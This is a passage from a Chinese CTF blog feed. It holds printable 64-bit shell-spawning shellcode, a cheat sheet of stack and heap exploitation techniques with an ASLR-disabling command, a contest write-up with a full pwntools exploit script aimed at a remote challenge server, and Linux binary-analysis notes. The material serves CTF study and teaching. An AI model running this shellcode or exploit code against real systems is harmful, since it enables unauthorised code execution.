    <content type="html"><![CDATA[<h1 id="64位可打印shell"><a href="#64位可打印shell" class="headerlink" title="64位可打印shell"></a>64位可打印shell</h1><p>PPYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXA</p><h1 id="pwntools模块"><a href="#pwntools模块" class="headerlink" title="pwntools模块"></a>pwntools模块</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'amd64'</span> <span class="comment">#64位</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure><h1 id="shellcode-encoder"><a href="#shellcode-encoder" class="headerlink" title="shellcode_encoder"></a>shellcode_encoder</h1><p>下载地址：<a href="https://github.com/ecx86/shellcode_encoder" target="_blank" rel="noopener">https://github.com/ecx86/shellcode_encoder</a></p><p>自动生成可打印shell：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ./main.py shellcode rax+29</span><br></pre></td></tr></table></figure><p>其中shellcode为原shellcode的二进制文件，rax+29表示通过call rax执行shellcode。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;64位可打印shell&quot;&gt;&lt;a href=&quot;#64位可打印shell&quot; class=&quot;headerlink&quot; title=&quot;64位可打印shell&quot;&gt;&lt;/a&gt;64位可打印shell&lt;/h1&gt;&lt;p&gt;PPYh00AAX1A0hA004X1A4hA00AX1A8QX44
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/tags/pwn/"/>
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>pwn中各种利用技巧1</title>
    <link href="https://nuoye-blog.github.io/2020/05/09/pwn/pwn%E4%B8%AD%E5%90%84%E7%A7%8D%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A71/"/>
    <id>https://nuoye-blog.github.io/2020/05/09/pwn/pwn%E4%B8%AD%E5%90%84%E7%A7%8D%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A71/</id>
    <published>2020-05-08T16:00:00.000Z</published>
    <updated>2020-05-18T08:42:30.276Z</updated>
    
    <content type="html"><![CDATA[<h1 id="关闭aslr"><a href="#关闭aslr" class="headerlink" title="关闭aslr"></a>关闭aslr</h1><p>sudo sysctl -w kernel.randomize_va_space=0</p><h1 id="绑定libc"><a href="#绑定libc" class="headerlink" title="绑定libc"></a>绑定libc</h1><p>p=process([‘./bin’],env={‘LOAD_PRELOAD’:’./libc-2.23.so’})</p><h1 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h1><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p><strong>Defcon 2015 Qualifier R0pbaby，AliCTF 2016 vss，PlaidCTF 2013 ropasaurusrex</strong></p><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>找后门位置</p><h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>shellcode的编写，以及一些编码的方法，如可见字符的shellcode等</p><h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p>参数的设置</p><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>leak出libc，以及确定libc的版本</p><h3 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h3><p>__libc_csu_init中的gadgets</p><h3 id="ret2reg"><a href="#ret2reg" class="headerlink" title="ret2reg"></a>ret2reg</h3><p>找call reg或者jmp reg</p><h2 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h2><p>Defcon 2015 Qualifier fuckup</p><h2 id="BROP"><a href="#BROP" class="headerlink" title="BROP"></a>BROP</h2><p><a href="http://ytliu.info/blog/2014/05/31/blind-return-oriented-programming-brop-attack-er" target="_blank" rel="noopener">http://ytliu.info/blog/2014/05/31/blind-return-oriented-programming-brop-attack-er</a></p><p><strong>HCTF 2016 出题人跑路了(pwn50)</strong></p><h2 id="stack-pivot"><a href="#stack-pivot" class="headerlink" title="stack pivot"></a>stack pivot</h2><p><strong>EKOPARTY CTF 2016 fuckzing-exploit-200(基于栈的stack pivot)</strong><br><strong>HACKIM CTF 2015 -Exploitation 5(基于堆的stack pivot)</strong></p><h2 id="ret2dl-resolve"><a href="#ret2dl-resolve" class="headerlink" title="ret2dl_resolve"></a>ret2dl_resolve</h2><p>了解动态链接的过程：<br>《程序员的自我修养》<br><a href="http://blog.chinaunix.net/uid-2477416-id-3053007.html" target="_blank" rel="noopener">http://blog.chinaunix.net/uid-2477416-id-3053007.html</a></p><p>伪造动态链接的相关数据结构如linkmap、relplt：<br><a href="http://rk700.github.io/2015/08/09/return-to-dl-resolve/" target="_blank" rel="noopener">http://rk700.github.io/2015/08/09/return-to-dl-resolve/</a><br><a href="http://angelboy.logdown.com/posts/283218-return-to-dl-resolve" target="_blank" rel="noopener">http://angelboy.logdown.com/posts/283218-return-to-dl-resolve</a><br><a href="http://www.inforsec.org/wp/?p=389" target="_blank" rel="noopener">http://www.inforsec.org/wp/?p=389</a><br><strong>Codegate CTF Finals 2015 yocto(fake relplt) <a href="http://o0xmuhe.me/2016/10/25/yocto-writeup" target="_blank" rel="noopener">http://o0xmuhe.me/2016/10/25/yocto-writeup</a></strong><br><strong>HITCON QUALS CTF 2015 readable(fake linkmap)</strong></p><p><strong>Hack.lu’s 2015 OREO</strong></p><h2 id="Stack-smash"><a href="#Stack-smash" class="headerlink" title="Stack smash"></a>Stack smash</h2><p>覆盖canary保护输出的字符地址</p><h2 id="Partial-Overwrite"><a href="#Partial-Overwrite" class="headerlink" title="Partial Overwrite"></a>Partial Overwrite</h2><p><a href="http://ly0n.me/2015/07/30/bypass-aslr-with-partial-eip-overwrite/" target="_blank" rel="noopener">http://ly0n.me/2015/07/30/bypass-aslr-with-partial-eip-overwrite/</a><br>HCTF 2016 fheap(基于堆溢出的Partial overwrite)<br>溢出位数不够：<br><strong>XMAN 2016 广外女生-pwn</strong><br><strong>Codegate CTF Finals 2015,chess</strong></p><h1 id="Heap"><a href="#Heap" class="headerlink" title="Heap"></a>Heap</h1><h2 id="堆管理机制"><a href="#堆管理机制" class="headerlink" title="堆管理机制"></a>堆管理机制</h2><p>多数Linux发行版：ptmalloc/dlmalloc glibc内存管理ptmalloc源代码分析.pdf（精读1-27，粗读28-130）<br>Android/firfox:jemalloc<br>windows:微软自己实现了一套内存管理机制<br>Linux内核：slab、slub、slob分配器</p><h2 id="堆漏洞的利用思想"><a href="#堆漏洞的利用思想" class="headerlink" title="堆漏洞的利用思想"></a>堆漏洞的利用思想</h2><p>破坏堆内存管理的相关数据结构：如arena、bin、chunk<br>破坏堆内存中的用户数据：覆盖变量指针、函数指针、数据等<br>一般情况下都是为了构造任意内存读写以及控制流劫持</p><h2 id="堆漏洞的防护方法"><a href="#堆漏洞的防护方法" class="headerlink" title="堆漏洞的防护方法"></a>堆漏洞的防护方法</h2><p>保护堆内存管理相关的数据结构：Heap Canary、对数据结构进行加密、在堆管理代码中加入大量安全检查<br>通用防护：ASLR、DEP</p><h2 id="堆漏洞利用技术与技巧"><a href="#堆漏洞利用技术与技巧" class="headerlink" title="堆漏洞利用技术与技巧"></a>堆漏洞利用技术与技巧</h2><h3 id="Use-After-Free-amp-Double-Free"><a href="#Use-After-Free-amp-Double-Free" class="headerlink" title="Use After Free &amp; Double Free"></a>Use After Free &amp; Double Free</h3><p>UAF:<strong>DEFCON CTF Qualifier 2014:shitsco、BCTF 2016:router、HCTF 2016 5-days(较难)</strong></p><p>Double Free: <strong>0CTF 2016:freenote、HCTF 2016 fheap、HCTF 2016 5-days(较难)</strong></p><h3 id="Heap-Overwrite"><a href="#Heap-Overwrite" class="headerlink" title="Heap Overwrite"></a>Heap Overwrite</h3><h4 id="Overflow-directly"><a href="#Overflow-directly" class="headerlink" title="Overflow directly"></a>Overflow directly</h4><p><strong>XMAN 2016 fengshui(紫荆花 pwn)，SSC安全大会百度展厅 heapcanary，攻防世界 babyfengshui</strong></p><h4 id="Fastbin-attack"><a href="#Fastbin-attack" class="headerlink" title="Fastbin attack"></a>Fastbin attack</h4><p>利用套路:Heap fengshui，house of Spirit</p><p><strong>alictf 2016 fb，alictf 2016 starcraft，0ctf 2016 zerostorage(较难)</strong></p><p><strong>alictf 2016 starcraft，0ctf 2016 zerostorage(较难)</strong></p><p><strong>0ctf 2016 zerostorage(较难)</strong></p><h4 id="Unsorted-bin-attack"><a href="#Unsorted-bin-attack" class="headerlink" title="Unsorted bin attack"></a>Unsorted bin attack</h4><p>利用思路</p><p>​    victm-&gt;bk为要写入地址-4，再次分配时bck-&gt;fd=unsorted_chunks(av)会触发一个任意地址写。写入内容是libc中的一个地址。只不过此时unsortbin被破坏，再次分配代码会崩掉，通常可以改写global_max_fast，从而导致接下来所有分配都是在fastbin进行</p><p>​    通过堆溢出覆盖victim-&gt;bk为一个size为fake chunk，再次分配unsorted_chunks(av)-&gt;bk=bck会改写unsortbin链表头的bk，此时再分配x-4大小的内存即可返回fakechunk。</p><p><strong>0ctf2016 Zerostorage</strong></p><h4 id="Overwrite-Topchunk"><a href="#Overwrite-Topchunk" class="headerlink" title="Overwrite Topchunk"></a>Overwrite Topchunk</h4><p>House of Force:</p><p>​    Bin中没有任何合适的内存时会从Topchunk分配内存</p><p>​    改写Topchunk的size为一个很大的数，如0xffffffff，分配alloc_size-4大小的内存，由于alloc_size可控，所以此时topchunk位置可控，再次分配即可分配到想分配的位置</p><p>​    需要预先泄漏topchunk地址</p><p><strong>BCTF 2016 bcloud，BCT 2016 ruin(arm结构的程序)</strong></p><h4 id="Classical-amp-Modern-Unlink-Attack"><a href="#Classical-amp-Modern-Unlink-Attack" class="headerlink" title="Classical&amp;Modern Unlink Attack"></a>Classical&amp;Modern Unlink Attack</h4><p>Unlink:当free(mem)调用时，如果与mem相邻的块是空闲的，则会将其从空闲链表中拿(unlink)下来并与mem合并</p><p>classical Unlink Attack(现glibc中有检查，不可用)：</p><p>​    如果通过heapoverflow将P-&gt;bk以及P-&gt;fd覆盖位攻击者可控制的地址，那FD-&gt;bk=BK;BK-fd=FD;=&gt;P-&gt;fd-&gt;bk=P-&gt;bk;P-&gt;bk-&gt;fd=p-&gt;fd;造成任意写，不过要求(要写的内容+4)or(要写的内容+8)必须可写，否则会崩溃。</p><p>Modern Unlink Attack:</p><p>​    找一个Pointer X，*X=P，Overflow P-bk=X-4;P-fd=X-8</p><p>​    P-&gt;bk-&gt;fd==X-4-&gt;fd==P，P-&gt;fd-&gt;bk==X-8-&gt;bk=P</p><p>​    Unlink可得到*p=X，此时可通过P修改X，如果X是数据指针则可能造成任意地址读写</p><p><strong>Hitcon 2014 qualifier stkof，MMA CTF 2016 Dairy，PlaidCTF 2014 200 ezhp</strong></p><h4 id="Off-by-one-amp-Off-by-null"><a href="#Off-by-one-amp-Off-by-null" class="headerlink" title="Off by one &amp; Off by null"></a>Off by one &amp; Off by null</h4><p>Glibc_Adventures-The_Forgotten_Chunks.pdf</p><p><strong>off by one:MMA CTF 2016 Dairy</strong></p><p><strong>off by null:plaid CTF 2015 datastore，XMAN 2016 Final love_letter</strong></p><h4 id="Other-techniques"><a href="#Other-techniques" class="headerlink" title="Other techniques"></a>Other techniques</h4><p>改写morecore:<strong>HCTF 2016 5-days</strong></p><p>House of Orange : 改写_IO_list_all : <strong>Hitcon 2016House of orange</strong></p><h3 id="General-exploit-techniques"><a href="#General-exploit-techniques" class="headerlink" title="General exploit techniques"></a>General exploit techniques</h3><h4 id="Heap-fengshui-堆风水-堆排布"><a href="#Heap-fengshui-堆风水-堆排布" class="headerlink" title="Heap fengshui(堆风水/堆排布)"></a>Heap fengshui(堆风水/堆排布)</h4><p>通过操纵内存的分配与释放，来控制堆快装内存中的相对位置</p><p>动机：真实漏洞在利用的时候，堆是混乱的，因为存在漏洞的服务可能已经服务过很多用户，在触发漏洞时无法预计堆已经做了多少次malloc多少次free</p><p>Heap fengshui可以让堆从混乱状态转换为确定状态</p><p>不同的内存管理策略对应的heap fengshui的方法不同</p><p><strong>XMAN 2016 fengshui，33c3 CTF babyfengshui</strong></p><h4 id="Heap-spray-对喷"><a href="#Heap-spray-对喷" class="headerlink" title="Heap spray(对喷)"></a>Heap spray(对喷)</h4><p>不断分配分配内存，并填充(大量0x0c)+shellcode，直到0x0c0c0c0c内存地址被分配，多用于脚本语言漏洞的利用</p><p>大多数内存地址的值都是0x0c0c0c0c，0x0c0c0c0c地址也是0x0c slide+shellcode可以用其绕过ASLR，控制流劫持(jmpaddr/jmp <em>addr)时，只要addr是喷过地址都可以执行shellcode，注意</em><code>addr=0x0c0c0c0c **addr=0x0c0c0c0c  ***addr=0x0c0c0c0c</code></p><p>必须在NX关闭时才能直接用heap spray劫持控制流</p><p><strong>pwnhub.cn calc</strong></p><h4 id="Exploit-mmap-chunk"><a href="#Exploit-mmap-chunk" class="headerlink" title="Exploit mmap chunk"></a>Exploit mmap chunk</h4><p>当malloc内存块大于128k时，glibc会直接mmap内存</p><p>如果mmap的内存将整个binary的地址空间全部覆盖，我们可以轻松拿到任意地址相邻的堆内存，ASLR就失去意义</p><p>适用于没有限制分配内存大小的题目</p><p><strong>Hitcon 2014 qualifier stkof</strong></p><p>0ops培训资料Linux heap internal.pdf</p><h1 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h1><p><strong>MMACTF 2016 greeting，HCTF 2016 fheap，RuCTF 2016 weather</strong></p><h1 id="竞争条件漏洞"><a href="#竞争条件漏洞" class="headerlink" title="竞争条件漏洞"></a>竞争条件漏洞</h1><p><strong>安恒杯 武汉大学邀请赛 fackfuzz，stupid shell</strong></p><p><strong>stupid shell</strong></p><h1 id="代码逻辑漏洞"><a href="#代码逻辑漏洞" class="headerlink" title="代码逻辑漏洞"></a>代码逻辑漏洞</h1><p><strong>UCTF 2016 note</strong></p><h1 id="类型混淆漏洞"><a href="#类型混淆漏洞" class="headerlink" title="类型混淆漏洞"></a>类型混淆漏洞</h1><p><strong>CVE-2015-3077</strong></p><h1 id="缓冲区未初始化"><a href="#缓冲区未初始化" class="headerlink" title="缓冲区未初始化"></a>缓冲区未初始化</h1><p>栈未初始化时，栈中数据为上次函数调用留下的栈帧</p><p>堆未初始化时，堆中数据为上次使用该堆块所留下的数据</p><p><strong>UCTF 2016 note，华山杯2016决赛 SU_PWN，33C3 CTF PWN</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;关闭aslr&quot;&gt;&lt;a href=&quot;#关闭aslr&quot; class=&quot;headerlink&quot; title=&quot;关闭aslr&quot;&gt;&lt;/a&gt;关闭aslr&lt;/h1&gt;&lt;p&gt;sudo sysctl -w kernel.randomize_va_space=0&lt;/p&gt;
&lt;h1 id=
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/tags/pwn/"/>
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2019广外网安大赛-WP</title>
    <link href="https://nuoye-blog.github.io/2020/05/09/wp/2019%E5%B9%BF%E5%A4%96%E7%BD%91%E5%AE%89%E5%A4%A7%E8%B5%9B/wp/"/>
    <id>https://nuoye-blog.github.io/2020/05/09/wp/2019%E5%B9%BF%E5%A4%96%E7%BD%91%E5%AE%89%E5%A4%A7%E8%B5%9B/wp/</id>
    <published>2020-05-08T16:00:00.000Z</published>
    <updated>2020-05-08T17:26:13.291Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="枯燥的抽奖"><a href="#枯燥的抽奖" class="headerlink" title="枯燥的抽奖"></a>枯燥的抽奖</h2><p>首先用strpos计算出随机数值，并且弄好格式</p><p><img src="./img/1575162826401.png" alt="1575162826401"></p><p>再直接将该结果复制给php_mt_seed进行爆破</p><p><img src="./img/1575162876249.png" alt="1575162876249"></p><p>然后再回去把种子带入就可以得到字符串了</p><p><img src="./img/1575162911317.png" alt="1575162911317"></p><p>最后输回去并提交就get flag了√</p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="史上最简单的pwn"><a href="#史上最简单的pwn" class="headerlink" title="史上最简单的pwn"></a>史上最简单的pwn</h2><p>这道题是一道c++的。。。不会分析，只知道只能写0x20个字节，随便试了下分析结果，发现输入存在I的时候会把I替换为pretty，所以利用这个可以达到栈溢出的目的。然后就是libc的问题。。。本地很远程爆的不太一样。。。直接LibcSearcher了：<br><img src="./img/1575164909373.png" alt="1575164909373"></p><h2 id="宇宙无敌难搞"><a href="#宇宙无敌难搞" class="headerlink" title="宇宙无敌难搞"></a>宇宙无敌难搞</h2><p>简单的栈溢出，就是覆盖的时候会覆盖到索引的值，所以可以直接把索引修改为ret地址就行了：</p><p><img src="./img/1575164779677.png" alt="1575164779677"></p><h2 id="pwn-me"><a href="#pwn-me" class="headerlink" title="pwn_me"></a>pwn_me</h2><p>这道题首先得去壳：upx -d pwn_me，然后就是各种检查绕过了</p><p>1.利用格式化字符串漏洞先泄漏pie，然后再向0x202010处写入’w’</p><p>2.填充0x259字符来获取到canary</p><p>3.输入0x80000000来绕过检查</p><p>4.构造payload，使其满足条件</p><p>最终exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p = process('./pwn_me')</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">one = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">p = remote(<span class="string">'183.129.189.60'</span>,<span class="number">10027</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">'please input the secret key~'</span>)</span><br><span class="line">p.sendline(<span class="string">'[m]'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'enter'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'say'</span>)</span><br><span class="line">p.sendline(<span class="string">'%14$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">pie = int(p.recvline()[:<span class="number">-1</span>],<span class="number">16</span>)<span class="number">-0x183d</span></span><br><span class="line">p.recvuntil(<span class="string">'again'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">pay1 = <span class="string">'%119c%8$na%21$pa'</span>+p64(pie+<span class="number">0x202010</span>)</span><br><span class="line"><span class="keyword">print</span> len(pay1)</span><br><span class="line">p.sendline(pay1)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">a = int(p.recvuntil(<span class="string">'a'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">libc_base = a<span class="number">-240</span>-libc.sym[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'magic'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x259</span>))</span><br><span class="line">p.recvuntil(<span class="string">'dream'</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">0x259</span>)</span><br><span class="line">p.recvuntil(<span class="string">'a'</span>*<span class="number">0x258</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-ord(<span class="string">'a'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(canary)</span><br><span class="line">p.recvuntil(<span class="string">'hat is this?!'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x80000000</span>))</span><br><span class="line"></span><br><span class="line">pay2 = <span class="string">'a'</span>*<span class="number">0x258</span>+p64(canary)+<span class="string">'a'</span>*<span class="number">8</span>+p64(one[<span class="number">1</span>]+libc_base)</span><br><span class="line">b = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(pay2)):</span><br><span class="line"><span class="keyword">if</span> i == <span class="number">88</span>:</span><br><span class="line">b += <span class="string">'\x5a'</span></span><br><span class="line"><span class="keyword">elif</span> i == <span class="number">127</span>:</span><br><span class="line">b += <span class="string">'\x58'</span></span><br><span class="line"><span class="keyword">elif</span> i == <span class="number">137</span>:</span><br><span class="line">b += <span class="string">'\x5a'</span></span><br><span class="line"><span class="keyword">elif</span> i == <span class="number">154</span>:</span><br><span class="line">b += <span class="string">'\x6c'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">b += pay2[i]</span><br><span class="line">p.sendline(b)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>strlen的00截断问题，构造下可见字符开头再加上00的指令就行了(这里用了push 0)，另外这道题无法直接getshell，所以找了个直接读flag的：<br><img src="./img/1575164292115.png" alt="1575164292115"></p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="math"><a href="#math" class="headerlink" title="math"></a>math</h2><p>简单的计算题，直接提取后eval计算就行了</p><p><img src="./img/1575162995333.png" alt="1575162995333"></p><h2 id="fun"><a href="#fun" class="headerlink" title="fun"></a>fun</h2><p>猜拳游戏。。。之前字节跳动的比赛也有，。。直接上writeup</p><p><img src="./img/1575163042586.png" alt="1575163042586"></p><h2 id="听说你想要平均值"><a href="#听说你想要平均值" class="headerlink" title="听说你想要平均值"></a>听说你想要平均值</h2><p>这道题首先就是从png文件中提取出一个无加密的压缩包，CRC和flag.zip一样，直接明文攻击（参考<a href="https://www.cnblogs.com/leixiao-/p/9824557.html）" target="_blank" rel="noopener">https://www.cnblogs.com/leixiao-/p/9824557.html）</a></p><p>然后后面解压的除了出来第一个是<img src="./img/1575163177753.png" alt="1575163177753"></p><p>中13600的一半6800的base64编码，再继续解压出来的密码就是here.txt里的数字进行base64编码了，上脚本√</p><p><img src="./img/1575163352856.png" alt="1575163352856"></p><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="babyvm"><a href="#babyvm" class="headerlink" title="babyvm"></a>babyvm</h2><p>讲实话，这道题有点难，刚开始还被拐歪了。。。真正的密文应该是这里</p><p><img src="./img/1575163934277.png" alt="1575163934277"></p><p>然后再进行逆运算就好了</p><p><img src="./img/1575163944282.png" alt="1575163944282"></p><h2 id="pyre"><a href="#pyre" class="headerlink" title="pyre"></a>pyre</h2><p>先放到<a href="http://tool.lu/pyc/反编译，得到密文，以及加密方法，直接逆推就行了：" target="_blank" rel="noopener">http://tool.lu/pyc/反编译，得到密文，以及加密方法，直接逆推就行了：</a></p><p><img src="./img/1575163633664.png" alt="1575163633664"></p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>首先用脚本过前面的md5，然后再用login得到前面，计算出x，然后再签admin即可（ps：另外几个函数照抄就行）：</p><p><img src="./img/1575163734176.png" alt="1575163734176"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;枯燥的抽奖&quot;&gt;&lt;a href=&quot;#枯燥的抽奖&quot; class=&quot;headerlink&quot; title=&quot;枯燥的抽奖&quot;&gt;&lt;/a&gt;
      
    
    </summary>
    
    
      <category term="WP" scheme="https://nuoye-blog.github.io/categories/WP/"/>
    
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="WP" scheme="https://nuoye-blog.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>《Linux二进制分析》</title>
    <link href="https://nuoye-blog.github.io/2020/05/09/%E7%AC%94%E8%AE%B0/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/"/>
    <id>https://nuoye-blog.github.io/2020/05/09/%E7%AC%94%E8%AE%B0/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/</id>
    <published>2020-05-08T16:00:00.000Z</published>
    <updated>2020-05-08T17:28:58.202Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux环境和相关工具"><a href="#Linux环境和相关工具" class="headerlink" title="Linux环境和相关工具"></a>Linux环境和相关工具</h1><h2 id="Linux工具"><a href="#Linux工具" class="headerlink" title="Linux工具"></a>Linux工具</h2><h3 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h3><p>GNU调试器</p><h3 id="objdump"><a href="#objdump" class="headerlink" title="objdump"></a>objdump</h3><p>objdump -D ELF    查看ELF文件中所有节的数据或代码</p><p>objdump -d ELF    只查看ELF文件中的程序代码</p><p>objdump -tT ELF    查看所有符号</p><h3 id="objcopy"><a href="#objcopy" class="headerlink" title="objcopy"></a>objcopy</h3><p>要将.data节从一个ELF目标文件复制到另一个文件中，可以使用下面的指令：</p><p>objcopy -only-section=.data &lt;infile&gt; &lt;outfile&gt;</p><h3 id="strace"><a href="#strace" class="headerlink" title="strace"></a>strace</h3><p>system call trace是基于ptrace(2)系统调用的一款工具。通过在一个循环中使用PTRACE_SYSCALL请求来显示运行中程序的系统调用活动相关的信息以及程序执行中捕捉到的信号量。</p><p>使用strace命令来跟踪一个基本程序：</p><p>strace /bin/ls -o ls.out</p><p>使用strace命令附加到一个现存的进程上：</p><p>strace -p &lt;pid&gt; -o daemon.out</p><p>原始输出将会显示每个系统调用的文件描述编号，系统调用会将文件描述符作为参数：SYS_read(3,buf,sizeof(buf))</p><p>如果想查看读入到文件描述符3中的所有数据，可以运行下面的命令：</p><p>strace -e read=3 /bin/ls</p><h3 id="ltrace"><a href="#ltrace" class="headerlink" title="ltrace"></a>ltrace</h3><p>ltrace与strace非常类似。ltrace会解析共享库，并打印出用到的库函数。</p><h3 id="ftrace"><a href="#ftrace" class="headerlink" title="ftrace"></a>ftrace</h3><p>与ltrace类似，但还可以显示出二进制文件本身的函数调用。</p><p><a href="https://github.com/elfmaster/ftrace" target="_blank" rel="noopener">https://github.com/elfmaster/ftrace</a></p><h3 id="readelf"><a href="#readelf" class="headerlink" title="readelf"></a>readelf</h3><p>-h    查看ELF文件头</p><p>-S    查询节表头</p><p>-l    查询程序头表</p><p>-s    查询符号表</p><p>-e    查询ELF文件头数据</p><p>-r    查询重定位入口</p><p>-d    查询动态段</p><h3 id="ERESI"><a href="#ERESI" class="headerlink" title="ERESI"></a>ERESI</h3><p><a href="http://www.eresi-project.org" target="_blank" rel="noopener">http://www.eresi-project.org</a></p><h6 id="两篇文章："><a href="#两篇文章：" class="headerlink" title="两篇文章："></a>两篇文章：</h6><p>Cerberus ELF interface（<a href="http://www.phrack.org/archives/issues/61/8.txt）" target="_blank" rel="noopener">http://www.phrack.org/archives/issues/61/8.txt）</a><br>Embedded ELF debugging（<a href="http://www.phrack.org/archives/issues/63/9.txt）" target="_blank" rel="noopener">http://www.phrack.org/archives/issues/63/9.txt）</a></p><h3 id="有用的设备和文件"><a href="#有用的设备和文件" class="headerlink" title="有用的设备和文件"></a>有用的设备和文件</h3><h3 id="proc-lt-pid-gt-maps"><a href="#proc-lt-pid-gt-maps" class="headerlink" title="/proc/&lt;pid&gt;/maps"></a>/proc/&lt;pid&gt;/maps</h3><p>该文件保存了一个进程镜像的布局，通过展现每个内存映射来实现，展现的内容包括可执行文件、共享库、栈、堆和VDSO等。</p><h3 id="proc-kcore"><a href="#proc-kcore" class="headerlink" 